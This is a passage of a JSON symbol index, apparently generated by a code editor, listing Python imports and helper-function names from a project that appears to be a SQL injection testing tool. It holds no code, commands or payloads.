[
    {
        "label": "os",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "os",
        "description": "os",
        "detail": "os",
        "documentation": {}
    },
    {
        "label": "getpid",
        "importPath": "os",
        "description": "os",
        "isExtraImport": true,
        "detail": "os",
        "documentation": {}
    },
    {
        "label": "kill",
        "importPath": "os",
        "description": "os",
        "isExtraImport": true,
        "detail": "os",
        "documentation": {}
    },
    {
        "label": "SEEK_CUR",
        "importPath": "os",
        "description": "os",
        "isExtraImport": true,
        "detail": "os",
        "documentation": {}
    },
    {
        "label": "sys",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "sys",
        "description": "sys",
        "detail": "sys",
        "documentation": {}
    },
    {
        "label": "argv",
        "importPath": "sys",
        "description": "sys",
        "isExtraImport": true,
        "detail": "sys",
        "documentation": {}
    },
    {
        "label": "stdout",
        "importPath": "sys",
        "description": "sys",
        "isExtraImport": true,
        "detail": "sys",
        "documentation": {}
    },
    {
        "label": "stdout",
        "importPath": "sys",
        "description": "sys",
        "isExtraImport": true,
        "detail": "sys",
        "documentation": {}
    },
    {
        "label": "requests",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "requests",
        "description": "requests",
        "detail": "requests",
        "documentation": {}
    },
    {
        "label": "get",
        "importPath": "requests",
        "description": "requests",
        "isExtraImport": true,
        "detail": "requests",
        "documentation": {}
    },
    {
        "label": "re",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "re",
        "description": "re",
        "detail": "re",
        "documentation": {}
    },
    {
        "label": "subprocess",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "subprocess",
        "description": "subprocess",
        "detail": "subprocess",
        "documentation": {}
    },
    {
        "label": "PIPE",
        "importPath": "subprocess",
        "description": "subprocess",
        "isExtraImport": true,
        "detail": "subprocess",
        "documentation": {}
    },
    {
        "label": "json",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "json",
        "description": "json",
        "detail": "json",
        "documentation": {}
    },
    {
        "label": "threading",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "threading",
        "description": "threading",
        "detail": "threading",
        "documentation": {}
    },
    {
        "label": "Thread",
        "importPath": "threading",
        "description": "threading",
        "isExtraImport": true,
        "detail": "threading",
        "documentation": {}
    },
    {
        "label": "Lock",
        "importPath": "threading",
        "description": "threading",
        "isExtraImport": true,
        "detail": "threading",
        "documentation": {}
    },
    {
        "label": "Thread",
        "importPath": "threading",
        "description": "threading",
        "isExtraImport": true,
        "detail": "threading",
        "documentation": {}
    },
    {
        "label": "csv",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "csv",
        "description": "csv",
        "detail": "csv",
        "documentation": {}
    },
    {
        "label": "wave",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "wave",
        "description": "wave",
        "detail": "wave",
        "documentation": {}
    },
    {
        "label": "print_function",
        "importPath": "__future__",
        "description": "__future__",
        "isExtraImport": true,
        "detail": "__future__",
        "documentation": {}
    },
    {
        "label": "print_function",
        "importPath": "__future__",
        "description": "__future__",
        "isExtraImport": true,
        "detail": "__future__",
        "documentation": {}
    },
    {
        "label": "print_function",
        "importPath": "__future__",
        "description": "__future__",
        "isExtraImport": true,
        "detail": "__future__",
        "documentation": {}
    },
    {
        "label": "print_function",
        "importPath": "__future__",
        "description": "__future__",
        "isExtraImport": true,
        "detail": "__future__",
        "documentation": {}
    },
    {
        "label": "print_function",
        "importPath": "__future__",
        "description": "__future__",
        "isExtraImport": true,
        "detail": "__future__",
        "documentation": {}
    },
    {
        "label": "division",
        "importPath": "__future__",
        "description": "__future__",
        "isExtraImport": true,
        "detail": "__future__",
        "documentation": {}
    },
    {
        "label": "division",
        "importPath": "__future__",
        "description": "__future__",
        "isExtraImport": true,
        "detail": "__future__",
        "documentation": {}
    },
    {
        "label": "division",
        "importPath": "__future__",
        "description": "__future__",
        "isExtraImport": true,
        "detail": "__future__",
        "documentation": {}
    },
    {
        "label": "division",
        "importPath": "__future__",
        "description": "__future__",
        "isExtraImport": true,
        "detail": "__future__",
        "documentation": {}
    },
    {
        "label": "division",
        "importPath": "__future__",
        "description": "__future__",
        "isExtraImport": true,
        "detail": "__future__",
        "documentation": {}
    },
    {
        "label": "print_function",
        "importPath": "__future__",
        "description": "__future__",
        "isExtraImport": true,
        "detail": "__future__",
        "documentation": {}
    },
    {
        "label": "print_function",
        "importPath": "__future__",
        "description": "__future__",
        "isExtraImport": true,
        "detail": "__future__",
        "documentation": {}
    },
    {
        "label": "division",
        "importPath": "__future__",
        "description": "__future__",
        "isExtraImport": true,
        "detail": "__future__",
        "documentation": {}
    },
    {
        "label": "print_function",
        "importPath": "__future__",
        "description": "__future__",
        "isExtraImport": true,
        "detail": "__future__",
        "documentation": {}
    },
    {
        "label": "print_function",
        "importPath": "__future__",
        "description": "__future__",
        "isExtraImport": true,
        "detail": "__future__",
        "documentation": {}
    },
    {
        "label": "print_function",
        "importPath": "__future__",
        "description": "__future__",
        "isExtraImport": true,
        "detail": "__future__",
        "documentation": {}
    },
    {
        "label": "print_function",
        "importPath": "__future__",
        "description": "__future__",
        "isExtraImport": true,
        "detail": "__future__",
        "documentation": {}
    },
    {
        "label": "division",
        "importPath": "__future__",
        "description": "__future__",
        "isExtraImport": true,
        "detail": "__future__",
        "documentation": {}
    },
    {
        "label": "print_function",
        "importPath": "__future__",
        "description": "__future__",
        "isExtraImport": true,
        "detail": "__future__",
        "documentation": {}
    },
    {
        "label": "print_function",
        "importPath": "__future__",
        "description": "__future__",
        "isExtraImport": true,
        "detail": "__future__",
        "documentation": {}
    },
    {
        "label": "division",
        "importPath": "__future__",
        "description": "__future__",
        "isExtraImport": true,
        "detail": "__future__",
        "documentation": {}
    },
    {
        "label": "division",
        "importPath": "__future__",
        "description": "__future__",
        "isExtraImport": true,
        "detail": "__future__",
        "documentation": {}
    },
    {
        "label": "print_function",
        "importPath": "__future__",
        "description": "__future__",
        "isExtraImport": true,
        "detail": "__future__",
        "documentation": {}
    },
    {
        "label": "print_function",
        "importPath": "__future__",
        "description": "__future__",
        "isExtraImport": true,
        "detail": "__future__",
        "documentation": {}
    },
    {
        "label": "division",
        "importPath": "__future__",
        "description": "__future__",
        "isExtraImport": true,
        "detail": "__future__",
        "documentation": {}
    },
    {
        "label": "print_function",
        "importPath": "__future__",
        "description": "__future__",
        "isExtraImport": true,
        "detail": "__future__",
        "documentation": {}
    },
    {
        "label": "print_function",
        "importPath": "__future__",
        "description": "__future__",
        "isExtraImport": true,
        "detail": "__future__",
        "documentation": {}
    },
    {
        "label": "generators",
        "importPath": "__future__",
        "description": "__future__",
        "isExtraImport": true,
        "detail": "__future__",
        "documentation": {}
    },
    {
        "label": "print_function",
        "importPath": "__future__",
        "description": "__future__",
        "isExtraImport": true,
        "detail": "__future__",
        "documentation": {}
    },
    {
        "label": "print_function",
        "importPath": "__future__",
        "description": "__future__",
        "isExtraImport": true,
        "detail": "__future__",
        "documentation": {}
    },
    {
        "label": "print_function",
        "importPath": "__future__",
        "description": "__future__",
        "isExtraImport": true,
        "detail": "__future__",
        "documentation": {}
    },
    {
        "label": "print_function",
        "importPath": "__future__",
        "description": "__future__",
        "isExtraImport": true,
        "detail": "__future__",
        "documentation": {}
    },
    {
        "label": "print_function",
        "importPath": "__future__",
        "description": "__future__",
        "isExtraImport": true,
        "detail": "__future__",
        "documentation": {}
    },
    {
        "label": "print_function",
        "importPath": "__future__",
        "description": "__future__",
        "isExtraImport": true,
        "detail": "__future__",
        "documentation": {}
    },
    {
        "label": "print_function",
        "importPath": "__future__",
        "description": "__future__",
        "isExtraImport": true,
        "detail": "__future__",
        "documentation": {}
    },
    {
        "label": "struct",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "struct",
        "description": "struct",
        "detail": "struct",
        "documentation": {}
    },
    {
        "label": "zlib",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "zlib",
        "description": "zlib",
        "detail": "zlib",
        "documentation": {}
    },
    {
        "label": "optparse",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "optparse",
        "description": "optparse",
        "detail": "optparse",
        "documentation": {}
    },
    {
        "label": "OptionError",
        "importPath": "optparse",
        "description": "optparse",
        "isExtraImport": true,
        "detail": "optparse",
        "documentation": {}
    },
    {
        "label": "OptionParser",
        "importPath": "optparse",
        "description": "optparse",
        "isExtraImport": true,
        "detail": "optparse",
        "documentation": {}
    },
    {
        "label": "OptionError",
        "importPath": "optparse",
        "description": "optparse",
        "isExtraImport": true,
        "detail": "optparse",
        "documentation": {}
    },
    {
        "label": "OptionParser",
        "importPath": "optparse",
        "description": "optparse",
        "isExtraImport": true,
        "detail": "optparse",
        "documentation": {}
    },
    {
        "label": "OptionValueError",
        "importPath": "optparse",
        "description": "optparse",
        "isExtraImport": true,
        "detail": "optparse",
        "documentation": {}
    },
    {
        "label": "select",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "select",
        "description": "select",
        "detail": "select",
        "documentation": {}
    },
    {
        "label": "socket",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "socket",
        "description": "socket",
        "detail": "socket",
        "documentation": {}
    },
    {
        "label": "*",
        "importPath": "socket",
        "description": "socket",
        "isExtraImport": true,
        "detail": "socket",
        "documentation": {}
    },
    {
        "label": "*",
        "importPath": "socket",
        "description": "socket",
        "isExtraImport": true,
        "detail": "socket",
        "documentation": {}
    },
    {
        "label": "*",
        "importPath": "socket",
        "description": "socket",
        "isExtraImport": true,
        "detail": "socket",
        "documentation": {}
    },
    {
        "label": "*",
        "importPath": "socket",
        "description": "socket",
        "isExtraImport": true,
        "detail": "socket",
        "documentation": {}
    },
    {
        "label": "base64",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "base64",
        "description": "base64",
        "detail": "base64",
        "documentation": {}
    },
    {
        "label": "b64encode",
        "importPath": "base64",
        "description": "base64",
        "isExtraImport": true,
        "detail": "base64",
        "documentation": {}
    },
    {
        "label": "sqlite3",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "sqlite3",
        "description": "sqlite3",
        "detail": "sqlite3",
        "documentation": {}
    },
    {
        "label": "traceback",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "traceback",
        "description": "traceback",
        "detail": "traceback",
        "documentation": {}
    },
    {
        "label": "format_exc",
        "importPath": "traceback",
        "description": "traceback",
        "isExtraImport": true,
        "detail": "traceback",
        "documentation": {}
    },
    {
        "label": "print_exc",
        "importPath": "traceback",
        "description": "traceback",
        "isExtraImport": true,
        "detail": "traceback",
        "documentation": {}
    },
    {
        "label": "setHandler",
        "importPath": "lib.controller.handler",
        "description": "lib.controller.handler",
        "isExtraImport": true,
        "detail": "lib.controller.handler",
        "documentation": {}
    },
    {
        "label": "lib.core.common",
        "kind": 6,
        "isExtraImport": true,
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "Backend",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "Format",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "Backend",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "extractRegexResult",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "extractTextTagContent",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "filterNone",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "findDynamicContent",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "Format",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getFilteredPageContent",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getLastRequestHTTPError",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getPublicTypeMembers",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getSafeExString",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getSortedInjectionTests",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "hashDBRetrieve",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "hashDBWrite",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "intersect",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isDigit",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "joinValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "listToStrValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "parseFilePaths",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "popValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "pushValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "randomInt",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "randomStr",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "readInput",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "showStaticWords",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "singleTimeLogMessage",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "singleTimeWarnMessage",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "unArrayizeValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "wasLastResponseDBMSError",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "wasLastResponseHTTPError",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "dataToStdout",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "extractRegexResult",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getFilteredPageContent",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getPublicTypeMembers",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getSafeExString",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "hashDBRetrieve",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "hashDBWrite",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "intersect",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isDigit",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isListLike",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "parseTargetUrl",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "popValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "pushValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "randomInt",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "randomStr",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "readInput",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "removePostHintPrefix",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "safeCSValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "showHttpErrorCodes",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "urldecode",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "urlencode",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "Backend",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "Backend",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "extractRegexResult",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "filterNone",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getSQLSnippet",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getTechnique",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getTechniqueData",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "hashDBRetrieve",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isDBMSVersionAtLeast",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isNumber",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isTechniqueAvailable",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "randomInt",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "randomStr",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "safeSQLIdentificatorNaming",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "safeStringFormat",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "singleTimeWarnMessage",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "splitFields",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "unArrayizeValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "urlencode",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "zeroDepthSearch",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "Backend",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "checkFile",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "dataToDumpFile",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "dataToStdout",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "filterNone",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getSafeExString",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isListLike",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isNoneValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "normalizeUnicode",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "openFile",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "prioritySortColumns",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "randomInt",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "safeCSValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "unArrayizeValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "unsafeSQLIdentificatorNaming",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getSafeExString",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "saveConfig",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "Backend",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "boldifyMessage",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "checkFile",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "dataToStdout",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "decodeStringEscape",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "fetchRandomAgent",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "filterNone",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "findLocalPort",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "findPageForms",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getConsoleWidth",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getFileItems",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getFileType",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getPublicTypeMembers",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getSafeExString",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "intersect",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "normalizePath",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "ntToPosixSlashes",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "openFile",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "parseRequestFile",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "parseTargetDirect",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "paths",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "randomStr",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "readCachedFileContent",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "readInput",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "resetCookieJar",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "runningAsAdmin",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "safeExpandUser",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
